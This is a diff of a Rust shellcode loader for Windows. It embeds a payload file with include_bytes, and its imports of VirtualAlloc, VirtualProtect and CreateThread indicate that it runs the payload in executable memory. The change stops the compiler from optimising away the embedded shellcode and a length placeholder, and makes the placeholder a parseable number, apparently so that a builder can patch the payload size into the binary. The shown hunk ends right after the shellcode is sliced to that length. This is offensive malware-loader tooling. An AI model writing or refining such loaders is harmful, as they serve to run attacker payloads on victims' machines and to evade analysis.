@@ -1,16 +1,30 @@
 use std::mem::transmute;
 use std::ptr::{copy, null, null_mut};
+use std::hint::black_box;
 use windows_sys::Win32::Foundation::{GetLastError, FALSE, WAIT_FAILED};
 use windows_sys::Win32::System::Memory::{
     VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
 };
 use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject};
 
+// Force the size holder to be embedded in the binary by preventing optimization
+#[inline(never)]
+fn get_size_holder() -> &'static str {
+    // Use a valid numeric string that can be parsed
+    black_box("999999")
+}
+
+// Force the shellcode data to be preserved
+#[inline(never)]
+fn get_shellcode() -> &'static [u8] {
+    black_box(include_bytes!("../shellcode"))
+}
+
 #[cfg(target_os = "windows")]
 fn main() {
-    let shellcode = include_bytes!("../shellcode");
-    const SIZE_HOLDER: &str = "$$99999$$";
-    let shellcode_len = usize::from_str_radix(SIZE_HOLDER, 10).unwrap();
+    let shellcode = get_shellcode();
+    let size_holder_str = get_size_holder();
+    let shellcode_len = usize::from_str_radix(size_holder_str, 10).unwrap();
     let shellcode = &shellcode[0..shellcode_len];
     let shellcode_size = shellcode.len();
 
